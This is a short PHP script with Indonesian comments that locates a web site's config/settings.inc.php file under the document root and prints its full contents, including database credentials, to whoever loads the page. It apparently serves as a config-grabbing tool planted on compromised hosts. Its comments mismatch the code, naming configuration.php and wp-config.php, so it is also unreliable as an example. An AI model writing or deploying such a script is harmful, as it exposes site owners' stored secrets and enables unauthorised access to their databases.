<?php
// Mendapatkan path ke direktori public_html dari variabel lingkungan
$publicHtmlDir = $_SERVER['DOCUMENT_ROOT'];

// Mencari file configuration.php di seluruh direktori
$files = glob($publicHtmlDir . '/config/settings.inc.php');

// Mengecek apakah ada file configuration.php yang ditemukan
if (!empty($files)) {
    // Loop melalui setiap file yang ditemukan
    foreach ($files as $file) {
        // Membaca isi file
        $fileContents = file_get_contents($file);

        // Menampilkan isi file sebagai teks
        echo '<pre>' . htmlspecialchars($fileContents) . '</pre>';
    }
} else {
    echo 'File wp-config.php tidak ditemukan.';
}
